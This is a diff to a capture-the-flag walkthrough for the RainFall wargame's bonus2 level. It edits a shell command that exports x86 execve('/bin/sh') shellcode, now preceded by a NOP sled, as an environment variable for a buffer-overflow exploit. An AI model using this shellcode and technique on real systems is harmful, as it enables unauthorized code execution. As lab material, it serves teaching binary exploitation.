@@ -115,7 +115,7 @@ Check the [level1's walkthrough](../level1/walkthrough.md#ret2shellcode) for an 
 
 We can either feed our shellcode to the program, or we can put the shellcode in an environment variable. For convenience, we'll use the environment variable:
 ```bash
-bonus2@RainFall:~$ export EXPLOIT=`python -c "print '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
+bonus2@RainFall:~$ export EXPLOIT=`python -c "print '\x90' * 200 + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
 ```
 
 We'll write and run a C program to find the address of the environment variable:
